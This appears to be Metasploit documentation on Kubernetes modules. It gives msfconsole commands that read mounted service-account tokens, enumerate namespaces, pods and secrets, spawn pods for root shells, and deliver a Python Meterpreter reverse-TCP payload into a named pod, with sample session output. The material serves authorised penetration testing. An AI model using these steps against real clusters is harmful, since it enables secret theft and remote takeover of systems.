## Kubernetes Workflows
In the future there may be more modules than listed here, for the full list of modules run the `search` command within msfconsole:
```msf
msf6 > search kubernetes
```

### Lab Environment
### Kubernetes Enumeration
will be gathered from the session host automatically. The `TOKEN` will be read from the mounted `/run/secrets/kubernetes.io/serviceaccount/token` file if available:
```
use auxiliary/cloud/kubernetes/enum_kubernetes
run session=-1
```

If the Kubernetes API is publicly accessible and you have a JWT Token:
```msf
msf6 > use cloud/kubernetes/enum_kubernetes
msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > set RHOST https://kubernetes.docker.internal:6443
RHOST => https://kubernetes.docker.internal:6443
msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > set TOKEN eyJhbGciO...
TOKEN => eyJhbGciO...
msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > run
[*] Running module against 127.0.0.1

[+] Kubernetes service version: {"major":"1","minor":"21","gitVersion":"v1.21.2","gitCommit":"092fbfbf53427de67cac1e9fa54aaa09a28371d7","gitTreeState":"clean","buildDate":"2021-06-16T12:53:14Z","goVersion":"go1.16.5","compiler":"gc","platform":"linux/amd64"}
[+] Enumerating namespaces
Namespaces
==========

  #  name
  -  ----
  0  default
  1  kube-node-lease
  2  kube-public
  3  kube-system
  4  kubernetes-dashboard

... etc ...
```

By default the `run` command will enumerate all resources available, but you can also specify which actions you would like to perform:
```msf
msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > show actions

Auxiliary actions:

   Name        Description
   ----        -----------
   all         enumerate all resources
   auth        enumerate auth
   namespace   enumerate namespace
   namespaces  enumerate namespaces
   pod         enumerate pod
   pods        enumerate pods
   secret      enumerate secret
   secrets     enumerate secrets
   version     enumerate version
```

More usage examples:
```
# Configuration
use cloud/kubernetes/enum_kubernetes
set RHOST https://kubernetes.docker.internal:6443
set TOKEN eyJhbGciOiJSUz...

# Enumeration, filtering, and displaying information:
run
namespaces
namespaces name=kube-public
auth
auth output=json
secrets
pods
pod
pod namespace=default name=redis-7fd956df5-sbchb
pod namespace=default name=redis-7fd956df5-sbchb output=json
pod namespace=default name=redis-7fd956df5-sbchb output=table
version
```

### Kubernetes Execution
will be gathered from the session host automatically. The `TOKEN` will be read from the mounted `/run/secrets/kubernetes.io/serviceaccount/token` file if available:
```msf
msf6 exploit(multi/kubernetes/exec) > set TARGET Interactive\ WebSocket
TARGET => Interactive WebSocket
msf6 exploit(multi/kubernetes/exec) > run RHOST="" RPORT="" POD="" SESSION=-1

[*] Routing traffic through session: 1
[+] Kubernetes service host: 10.96.0.1:443
[*] Using image: busybox
[+] Pod created: burhgvzc
[*] Waiting for the pod to be ready...
[+] Successfully established the WebSocket
[*] Found shell.
[*] Command shell session 2 opened (172.17.0.31:59437 -> 10.96.0.1:443) at 2021-10-01 10:05:57 -0400

id
uid=0(root) gid=0(root) groups=10(wheel)
pwd
/
```

If the Kubernetes API is available remotely, the RHOST values and token can be set manually. In this scenario a token is manually specified, to execute a Python Meterpreter payload within the `thinkphp-67f7c88cc9-tgpfh` pod:
```msf
msf6 > use exploit/multi/kubernetes/exec
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/kubernetes/exec) > set TOKEN eyJhbGciOiJSUzI1...
TOKEN => eyJhbGciOiJSUzI1...
msf6 exploit(multi/kubernetes/exec) > set POD thinkphp-67f7c88cc9-tgpfh
POD => thinkphp-67f7c88cc9-tgpfh
msf6 exploit(multi/kubernetes/exec) > set RHOSTS 192.168.159.31
RHOSTS => 192.168.159.31
msf6 exploit(multi/kubernetes/exec) > set TARGET Python
TARGET => Python
msf6 exploit(multi/kubernetes/exec) > set PAYLOAD python/meterpreter/reverse_tcp
PAYLOAD => python/meterpreter/reverse_tcp
msf6 exploit(multi/kubernetes/exec) > run

[*] Started reverse TCP handler on 192.168.159.128:4444
[*] Sending stage (39736 bytes) to 192.168.159.31
[*] Meterpreter session 1 opened (192.168.159.128:4444 -> 192.168.159.31:59234) at 2021-10-01 09:55:00 -0400

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : thinkphp-67f7c88cc9-tgpfh
OS           : Linux 5.4.0-88-generic #99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021
Architecture : x64
Meterpreter  : python/linux
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/kubernetes/exec) >
```

